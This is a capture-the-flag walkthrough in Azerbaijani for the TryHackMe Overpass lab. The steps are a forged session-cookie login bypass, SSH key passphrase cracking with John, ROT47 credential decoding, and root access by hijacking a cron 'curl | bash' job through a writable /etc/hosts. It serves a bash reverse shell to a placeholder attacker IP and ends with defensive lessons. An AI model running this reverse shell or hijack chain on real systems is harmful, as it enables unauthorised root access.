# Overpass CTF — Writeup (TryHackMe)
**Çətinlik:** Asan  
**Platforma:** TryHackMe  
**Müəllif:** Hackhunt  

---

## Hədəf Haqqında

Overpass — şifrə meneceri proqramı hazırlayan bir şirkətin serveridir. Məqsəd: istifadəçi və root flag-larını tapmaq.

---

## 1. Kəşfiyyat (Reconnaissance)

### Nmap Scan
```bash
nmap -sV -sC 10.81.181.168
```
**Açıq portlar:**
- `22` — SSH
- `80` — HTTP (Overpass veb saytı)

---

## 2. Veb Saytın Araşdırılması

Brauzdə `http://10.81.181.168` açıldı. Saytda **Login** səhifəsi var idi.

### Login Kodunun Analizi

`/login.js` faylı araşdırıldı:

```javascript
Cookies.set("SessionToken", statusOrCookie)
window.location = "/admin"
```

**Boşluq:** Server yalnız `SessionToken` cookie-nin **mövcudluğunu** yoxlayır, dəyərinin düzgünlüyünü yox!

### Cookie Manipulation

1. `F12` → **Application** → **Storage** → **Cookies**
2. `+` düyməsi ilə yeni cookie əlavə edildi:
   - **Name:** `SessionToken`
   - **Value:** `anything`
3. `/admin` səhifəsinə getdik → **Admin paneli açıldı!**

**Nəticə:** Admin paneldə James-ə aid **şifrəli RSA private key** tapıldı.

---

## 3. SSH Girişi (User Flag)

### SSH Key-in Qırılması

```bash
# Key faylını saxla
nano id_rsa
chmod 600 id_rsa

# ssh2john ilə hash çıxar
ssh2john id_rsa > hash.txt

# John ilə qır
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Tapılan passphrase:** `james13`

### SSH ilə Qoşulma

```bash
ssh -i id_rsa james@10.81.181.168
```

### Overpass Şifrə Menecerindən Şifrə

```bash
cat /home/james/.overpass
```

**Şifrəli mətn (ROT47):**
```
,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN
```

**Decode:**
```bash
echo ',LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN' | tr '!-~' 'P-~!-O'
```

**Nəticə:**
```json
[{"name":"System","pass":"saydrawnlyingpicture"}]
```

### User Flag

```bash
cat /home/james/user.txt
```

🚩 **User flag əldə edildi!**

---

## 4. Privilege Escalation (Root Flag)

### Crontab Analizi

```bash
cat /etc/crontab
```

**Kritik sətir:**
```
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

Root hər dəqiqə `overpass.thm` domenindən script yükləyib işlədir!

### /etc/hosts Zəifliyi

```bash
ls -la /etc/hosts
# -rw-rw-rw-  ← Hamı yaza bilər!
```

```bash
cat /etc/hosts
# 127.0.0.1 overpass.thm
```

**Plan:** `/etc/hosts`-u dəyişdirərək `overpass.thm`-i öz Kali maşınımıza yönləndirəcəyik!

### Exploit

**Kali-də Terminal 1 — Saxta Script və HTTP Server:**
```bash
mkdir -p downloads/src
echo "bash -i >& /dev/tcp/KALI_IP/4444 0>&1" > downloads/src/buildscript.sh
sudo python3 -m http.server 80
```

**Kali-də Terminal 2 — Netcat:**
```bash
nc -lvnp 4444
```

**James SSH-da — /etc/hosts Dəyişdirildi:**
```bash
echo "KALI_IP overpass.thm" > /etc/hosts
```

### Nə Baş Verdi?

```
1. /etc/hosts dəyişdirildi → overpass.thm = Kali IP
2. Cron işlədi → curl overpass.thm/downloads/src/buildscript.sh
3. curl Kali-yə baxdı → bizim saxta scripti yüklədi
4. Script root kimi işlədi → reverse shell göndərdi
5. nc tutdu → ROOT SHELL! 🎉
```

### Root Flag

```bash
cat /root/root.txt
```

🚩 **Root flag əldə edildi!**

---

## 5. İstifadə Olunan Boşluqlar

| Boşluq | Təsvir |
|--------|--------|
| Cookie Manipulation | Server SessionToken dəyərini yoxlamırdı |
| Zəif Şifrələmə | ROT47 şifrələmə çox asanlıqla decode edilir |
| Şifrəli SSH Key | Zəif passphrase rockyou ilə tapıldı |
| Yazıla Bilən /etc/hosts | James faylı dəyişdirə bilirdi |
| Təhlükəli Cron Job | `curl URL \| bash` — DNS Spoofing-ə açıqdır |

---

## 6. Öyrəndiklərimiz

- **Cookie-ləri həmişə server tərəfində yoxla** — client-side yoxlama etibarsızdır
- **`curl URL | bash` istifadə etmə** — DNS/MITM hücumlarına açıqdır
- **`/etc/hosts` icazələrini yoxla** — yazıla bilən olmamalıdır
- **Zəif şifrələmə** (ROT47) real mühafizə deyil
- **SSH key passphrase-lərini güclü seç**

---

*TryHackMe — Overpass Room tamamlandı! 🏁*
